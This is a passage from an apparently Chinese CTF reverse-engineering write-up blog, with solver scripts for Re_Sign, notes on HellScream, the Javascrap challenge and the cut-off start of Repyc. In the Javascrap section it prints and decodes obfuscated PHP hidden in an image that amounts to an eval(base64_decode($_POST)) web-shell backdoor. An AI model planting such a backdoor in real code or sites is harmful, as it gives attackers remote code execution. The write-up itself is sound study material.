class="line">    k = ((k &gt;&gt; <span class="number">16</span>)) | ((~(k &lt;&lt; <span class="number">16</span>)) &amp; <span class="number">0xffff0000</span>)</span><br><span class="line">    k = ((k &lt;&lt; key[i//<span class="number">4</span>])) | (k &gt;&gt; ((<span class="number">32</span>-key[i//<span class="number">4</span>]) &amp; <span class="number">0xff</span>))</span><br><span class="line">    k &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>不得不说，有了源码解起来真方便，不然还得过反调， 反调还被<code>hook</code>了</p><h3 id="HellScream"><a href="#HellScream" class="headerlink" title="HellScream"></a>HellScream</h3><p><a target="_blank" rel="noopener" href="https://www.kanxue.com/book-35-376.htm">4. 2016年 第19题 - 看雪 2016 CTF题解视频 - 其他内容 - 看雪-安全培训|安全招聘|www.kanxue.com</a></p><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-214562-1.htm">[原创]看雪2016 第十九题 CrackMe逆向分析-CTF对抗-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46296905/article/details/116382650">[BUU]HellScream_m0_46296905的博客-CSDN博客</a></p><p>不看题解看不出来大数运算……..</p><h3 id="De1CTF2019-Re-Sign"><a href="#De1CTF2019-Re-Sign" class="headerlink" title="[De1CTF2019]Re_Sign"></a>[De1CTF2019]Re_Sign</h3><p>upx加壳了，不知道为什么用<code>upx</code>程序解压不了，直接<code>ESP定律</code>大法解压出来</p><p>根据字符串找到主要函数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019203613830.png" alt="image-20211019203613830"></p><p>动调发现输入<code>111</code>会变成<code>EP4f</code>, 这种<code>3</code>字符变<code>4</code>字符很像base64</p><p>在输入后，在输入处下硬件断点，动调在<code>Encrypt</code>中找到新表</p><p>接着进入<code>checkFunc</code>， 动调找到比对位置</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019205121824.png" alt="image-20211019205121824"></p><p>通过<code>sub_402160</code>得到 编码后的字符 在原表中的位置，并跟v18[v17]对比</p><p>则解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x00000008</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000020</span>, <span class="number">0x00000007</span>, <span class="number">0x00000034</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000018</span>, <span class="number">0x00000024</span>, <span class="number">0x00000013</span>, <span class="number">0x00000003</span>, <span class="number">0x00000010</span>, <span class="number">0x00000038</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000008</span>, <span class="number">0x00000034</span>, <span class="number">0x00000013</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000022</span>, <span class="number">0x00000012</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000012</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000022</span>, <span class="number">0x00000012</span>, <span class="number">0x00000017</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000029</span>, <span class="number">0x00000022</span>, <span class="number">0x00000006</span>, <span class="number">0x00000024</span>, <span class="number">0x00000032</span>, <span class="number">0x00000024</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000001F</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000024</span>, <span class="number">0x00000003</span>, <span class="number">0x00000015</span>]</span><br><span class="line">table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    cipher.append(table[i-<span class="number">1</span>])</span><br><span class="line">cipher = <span class="built_in">bytes</span>(cipher) + <span class="string">b&quot;==&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">new_table = <span class="string">b&quot;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&quot;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = cipher.translate(<span class="built_in">bytes</span>.maketrans(new_table, table))</span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h3><p>打开html, 可以看到</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211029205523970.png" alt="image-20211029205523970"></p><p>用010Editor查看图片，在文件末尾看到php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$terms</span> = <span class="keyword">array</span>(<span class="string">&quot;M&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line"><span class="variable">$order</span> = <span class="keyword">array</span>(<span class="number">59</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">63</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">49</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">80</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">40</span>, <span class="number">81</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">7</span>, <span class="number">88</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">23</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">40</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">21</span>, <span class="number">47</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">47</span>);</span><br><span class="line"><span class="variable">$do_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; count(<span class="variable">$order</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$do_me</span> = <span class="variable">$do_me</span> . <span class="variable">$terms</span>[<span class="variable">$order</span>[<span class="variable">$i</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$do_me</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>eval</code>改为<code>echo</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211029210012101.png" alt="image-20211029210012101"></p><p>找个在线工具打印一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=\<span class="string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span></span><br><span class="line"><span class="string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span></span><br><span class="line"><span class="string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span></span><br><span class="line"><span class="string">eval($___($__));</span></span><br></pre></td></tr></table></figure><p>其中<code>$___</code>和<code>$__</code>为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  Desktop bpython3</span><br><span class="line">bpython version <span class="number">0.17</span><span class="number">.1</span> on top of Python <span class="number">3.6</span><span class="number">.9</span> /usr/<span class="built_in">bin</span>/python3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">b&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">b&#x27;base64_decode&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;$code=base64_decode($_);eval($code);&#x27;</span></span><br></pre></td></tr></table></figure><p>则<code>base64_decode($_)</code>得</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&quot;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;if(isset($_POST[&quot;\\97\\49\\49\\68\\x4F\\84\\116\\x68\\97\\x74\\x44\\x4F\\x54\\x6A\\97\\x76\\x61\\x35\\x63\\x72\\97\\x70\\x41\\84\\x66\\x6C\\97\\x72\\x65\\x44\\65\\x53\\72\\111\\110\\68\\79\\84\\99\\x6F\\x6D&quot;])) &#123; eval(base64_decode($_POST[&quot;\\97\\49\\x31\\68\\x4F\\x54\\116\\104\\x61\\116\\x44\\79\\x54\\106\\97\\118\\97\\53\\x63\\114\\x61\\x70\\65\\84\\102\\x6C\\x61\\114\\101\\x44\\65\\x53\\72\\111\\x6E\\x44\\x4F\\84\\99\\x6F\\x6D&quot;])); &#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中字符串 <code>\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D</code>为: <code>a11DOTthatDOTjava5crapATflareDASHonDOTcom</code></p><p>替换<code>DOT =&gt; . ,DASH =&gt; - ,AT =&gt; @</code>得flag</p><p><code>a11.that.java5crap@flare-on.com</code></p><h3 id="watevrCTF-2019-Repyc"><a href="#watevrCTF-2019-Repyc" class="headerlink" title="[watevrCTF 2019]Repyc"></a>[watevrCTF 2019]Repyc</h3><p>用在线反编译工具<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>，反编译出来一个python虚拟机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line">佤 = <span class="number">0</span></span><br><span class="line">侰 = ~佤 * ~佤</span><br><span class="line">俴 = 侰 + 侰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 䯂(<span class="params">䵦</span>):</span></span><br><span class="line">    굴 = 佤</span><br><span class="line">    굿 = 佤</span><br><span class="line">    괠 = [佤] * 俴 ** (俴 * 俴)</span><br><span class="line">    궓 = [佤] * <span class="number">100</span></span><br><span class="line">    괣 = []</span><br><span class="line">    <span class="keyword">while</span> 䵦[굴][佤] != <span class="string">&quot;\xeb\x93\x83&quot;</span>:</span><br><span class="line">        굸 = 䵦[굴][佤].lower()</span><br><span class="line">        亀 = 䵦[굴][侰:]</span><br><span class="line">        <span class="keyword">if</span> 굸 == <span class="string">&quot;\xeb\x89\x83&quot;</span>:</span><br><span class="line">            